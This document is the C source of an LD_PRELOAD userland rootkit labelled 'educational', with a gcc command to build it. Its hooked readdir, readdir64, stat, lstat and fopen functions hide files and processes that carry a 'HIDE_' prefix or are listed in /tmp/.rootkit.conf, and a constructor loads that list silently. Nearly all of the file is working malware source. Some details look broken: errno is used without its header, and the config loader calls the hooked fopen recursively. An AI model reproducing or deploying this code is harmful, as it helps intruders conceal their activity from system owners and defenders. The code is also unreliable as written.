/*
 * Educational Rootkit - LD_PRELOAD Library
 * ⚠️ FOR EDUCATIONAL PURPOSES ONLY
 *
 * This is an educational demonstration of LD_PRELOAD hooking.
 * NEVER use this on systems you don't own or without authorization.
 *
 * Compile: gcc -shared -fPIC -o librootkit.so rootkit.c -ldl
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

/* Configuration */
#define MAGIC_STRING "HIDE_"  // Prefix for hidden files/processes
#define CONFIG_FILE "/tmp/.rootkit.conf"

/* Original function pointers */
static struct dirent *(*original_readdir)(DIR *) = NULL;
static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
static int (*original_stat)(const char *, struct stat *) = NULL;
static int (*original_lstat)(const char *, struct stat *) = NULL;
static int (*original_open)(const char *, int, ...) = NULL;
static FILE *(*original_fopen)(const char *, const char *) = NULL;

/* Configuration storage */
static char hidden_processes[256][256];
static int num_hidden_processes = 0;
static char hidden_files[256][256];
static int num_hidden_files = 0;
static int config_loaded = 0;

/* Load configuration from file */
static void load_config() {
    if (config_loaded) return;

    FILE *fp = fopen(CONFIG_FILE, "r");
    if (!fp) {
        config_loaded = 1;
        return;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        line[strcspn(line, "\n")] = 0;  // Remove newline

        if (strncmp(line, "PROCESS:", 8) == 0) {
            if (num_hidden_processes < 256) {
                strncpy(hidden_processes[num_hidden_processes], line + 8, 255);
                num_hidden_processes++;
            }
        } else if (strncmp(line, "FILE:", 5) == 0) {
            if (num_hidden_files < 256) {
                strncpy(hidden_files[num_hidden_files], line + 5, 255);
                num_hidden_files++;
            }
        }
    }

    fclose(fp);
    config_loaded = 1;
}

/* Check if a string should be hidden */
static int should_hide(const char *name) {
    load_config();

    // Hide files with magic prefix
    if (strncmp(name, MAGIC_STRING, strlen(MAGIC_STRING)) == 0) {
        return 1;
    }

    // Hide configured processes
    for (int i = 0; i < num_hidden_processes; i++) {
        if (strstr(name, hidden_processes[i]) != NULL) {
            return 1;
        }
    }

    // Hide configured files
    for (int i = 0; i < num_hidden_files; i++) {
        if (strstr(name, hidden_files[i]) != NULL) {
            return 1;
        }
    }

    return 0;
}

/* Check if path is /proc/[pid] directory */
static int is_proc_pid(const char *name) {
    if (!name) return 0;

    // Check if it's a number (PID)
    for (int i = 0; name[i]; i++) {
        if (name[i] < '0' || name[i] > '9') {
            return 0;
        }
    }
    return 1;
}

/* Check if a process should be hidden */
static int should_hide_process(const char *pid) {
    char cmdline_path[512];
    char cmdline[1024];
    FILE *fp;

    snprintf(cmdline_path, sizeof(cmdline_path), "/proc/%s/cmdline", pid);

    // Use original fopen to avoid recursion
    if (!original_fopen) {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    fp = original_fopen(cmdline_path, "r");
    if (!fp) return 0;

    if (fgets(cmdline, sizeof(cmdline), fp) != NULL) {
        fclose(fp);
        return should_hide(cmdline);
    }

    fclose(fp);
    return 0;
}

/* Hooked readdir */
struct dirent *readdir(DIR *dirp) {
    if (!original_readdir) {
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;

    while ((entry = original_readdir(dirp)) != NULL) {
        // Check if this is a /proc directory
        char proc_path[512];
        snprintf(proc_path, sizeof(proc_path), "/proc/%s", entry->d_name);

        // If it's a process directory, check if we should hide it
        if (is_proc_pid(entry->d_name)) {
            if (should_hide_process(entry->d_name)) {
                continue;  // Skip this entry
            }
        }

        // Check if filename should be hidden
        if (should_hide(entry->d_name)) {
            continue;  // Skip this entry
        }

        return entry;
    }

    return NULL;
}

/* Hooked readdir64 */
struct dirent64 *readdir64(DIR *dirp) {
    if (!original_readdir64) {
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }

    struct dirent64 *entry;

    while ((entry = original_readdir64(dirp)) != NULL) {
        // Check if this is a /proc directory
        if (is_proc_pid(entry->d_name)) {
            if (should_hide_process(entry->d_name)) {
                continue;  // Skip this entry
            }
        }

        // Check if filename should be hidden
        if (should_hide(entry->d_name)) {
            continue;  // Skip this entry
        }

        return entry;
    }

    return NULL;
}

/* Hooked stat */
int stat(const char *pathname, struct stat *statbuf) {
    if (!original_stat) {
        original_stat = dlsym(RTLD_NEXT, "stat");
    }

    // Hide files by returning ENOENT
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return original_stat(pathname, statbuf);
}

/* Hooked lstat */
int lstat(const char *pathname, struct stat *statbuf) {
    if (!original_lstat) {
        original_lstat = dlsym(RTLD_NEXT, "lstat");
    }

    // Hide files by returning ENOENT
    if (should_hide(pathname)) {
        errno = ENOENT;
        return -1;
    }

    return original_lstat(pathname, statbuf);
}

/* Hooked fopen */
FILE *fopen(const char *pathname, const char *mode) {
    if (!original_fopen) {
        original_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    // Hide files by returning NULL
    if (should_hide(pathname)) {
        errno = ENOENT;
        return NULL;
    }

    return original_fopen(pathname, mode);
}

/* Constructor - runs when library is loaded */
__attribute__((constructor))
static void init(void) {
    // Silently load configuration
    load_config();
}
